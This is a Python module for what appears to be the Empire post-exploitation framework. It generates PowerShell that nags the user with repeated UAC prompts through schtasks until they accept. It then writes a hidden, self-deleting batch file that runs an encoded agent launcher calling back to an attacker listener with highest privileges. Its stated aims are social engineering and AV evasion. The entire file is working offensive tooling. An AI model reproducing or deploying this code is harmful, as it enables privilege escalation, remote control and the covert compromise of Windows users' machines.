from lib.common import helpers
import string
import random

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'SE-BypassUAC',
				
            'Author': ['Jack64'],
			    
            'Description': ("Adds a task to schtasks that will run the agent from a high-integrity context by means of a UAC prompt loop."
			    " The UAC prompt window is called by schtasks.exe and is therefore "
			    "a good way to socially-engineer the user to give you high integrity "
			    "access without the use of the BypassUAC DLLs, and thus evading AV."),

            'Background' : True,

            'OutputExtension' : None,
            
            'NeedsAdmin' : False,

            'OpsecSafe' : False,
            
            'MinPSVersion' : '2',
            
            'Comments': [
                'something something dark side.'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Listener' : {
                'Description'   :   'Listener to use.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'Proxy' : {
                'Description'   :   'Proxy to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'ProxyCreds' : {
                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            } 
        }
        
        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self):

        listenerName = self.options['Listener']['Value']

        # staging options
        userAgent = self.options['UserAgent']['Value']
        proxy = self.options['Proxy']['Value']
        proxyCreds = self.options['ProxyCreds']['Value']

        # read in the common module source code
	N=6
	filename=''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(N))
        moduleSource = '''
$storage=$Home+"\\'''+filename+'''.bat"
$k=0
while ($k -eq 0){
	try {
		Start-Process "schtasks" -ArgumentList "/create /sc minute /mo 1 /tn UserPrompt /tr $storage /RL HIGHEST /F" -Verb runAs -WindowStyle hidden
		$k=1
	}
	catch {
	}
}
$file="echo @off"
$file | Out-File $storage -encoding ASCII
$file="schtasks /delete /tn UserPrompt /f"
$file | Out-File $storage -encoding ASCII -Append
	'''


        if not self.mainMenu.listeners.is_listener_valid(listenerName):
            # not a valid listener, return nothing for the script
            print helpers.color("[!] Invalid listener: " + listenerName)
            return ""
        else:
            # generate the PowerShell one-liner with all of the proper options set
            launcher = self.mainMenu.stagers.generate_launcher(listenerName, encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
            if launcher == "":
                print helpers.color("[!] Error in launcher generation.")
                return ""
            else:			
		moduleSource+='$file="start /b '
		moduleSource+=launcher
		moduleSource+='"\r\n'
		moduleSource+='''
$file | Out-File $storage -encoding ASCII -Append
$file='start /b "" cmd /c del "%~f0"&exit /b'
$file | Out-File $storage -encoding ASCII -Append
Start-Process "schtasks" -ArgumentList "/create /sc minute /mo 1 /tn UserPrompt /tr $storage /RL HIGHEST /F" -Verb runAs -WindowStyle hidden
		'''
                return moduleSource
